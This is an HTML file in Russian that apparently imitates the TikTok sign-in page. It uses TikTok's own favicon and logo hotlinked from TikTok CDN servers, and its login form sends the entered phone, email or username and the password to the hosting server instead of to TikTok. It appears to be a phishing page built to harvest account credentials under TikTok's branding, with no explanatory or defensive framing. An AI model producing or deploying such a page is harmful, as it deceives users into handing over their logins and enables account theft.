<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TikTok – Войти</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="https://sf16-scmcdn-va.ibytedtos.com/obj/ies-sg-edc-useast1a/tiktok/favicon.ico">
</head>
<body>
    <div class="container">
        <img src="https://lf16-tiktok-common.ttcdn.com/obj/tiktok-web-common-sg/ies/tiktok_favicon.png" class="logo" alt="TikTok">
        
        <div class="login-box">
            <h1 class="title">Войти в TikTok</h1>
            
            <form action="/" method="post">
                <div class="input-group">
                    <input type="text" name="username" class="input-field" placeholder="Телефон, почта или логин" required autocomplete="username">
                </div>
                
                <div class="input-group">
                    <input type="password" name="password" class="input-field" placeholder="Пароль" required autocomplete="current-password">
                </div>
                
                <button type="submit" class="login-btn">Войти</button>
            </form>
            
            <div class="footer">
                Нет аккаунта? <a href="#">Зарегистрироваться</a>
            </div>
        </div>
    </div>
</body>
</html>
